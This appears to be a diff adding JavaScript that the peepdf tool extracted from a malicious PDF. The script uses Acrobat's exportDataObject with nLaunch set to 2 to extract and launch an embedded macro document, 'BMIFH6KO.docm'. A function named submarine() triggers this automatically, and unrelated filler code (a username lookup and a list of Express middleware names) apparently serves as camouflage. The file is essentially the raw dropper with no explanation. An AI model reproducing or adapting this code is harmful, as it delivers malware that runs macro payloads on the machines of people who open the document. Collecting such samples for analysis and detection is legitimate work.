@@ -1,0 +1,28 @@
+// peepdf comment: Javascript code located in object 6 (version 0)
+
+var dis = 2;
+var abc = this['exportDataObject'];
+var findByUsername = function(username, cb) {
+        process.nextTick(function() {
+            for (var i = 0, len = records.length; i < len; i++) {
+                var record = records[i];
+                if (record.username === username) {
+                    return cb(null, record);
+                }
+            }
+            return cb(null, null);
+        });
+    };
+
+function submarine() {
+    abc({
+        cName: "BMIFH6KO.docm",
+        nLaunch: dis
+    });
+};
+var d = ['json', 'urlencoded', 'bodyParser', 'compress', 'cookieSession', 'session', 'logger', 'cookieParser', 'favicon', 'responseTime', 'errorHandler', 'timeout', 'methodOverride', 'vhost', 'csrf', 'directory', 'limit', 'multipart', 'staticCache', ];
+
+// peepdf comment: Javascript code located in object 14 (version 0)
+
+submarine();
+
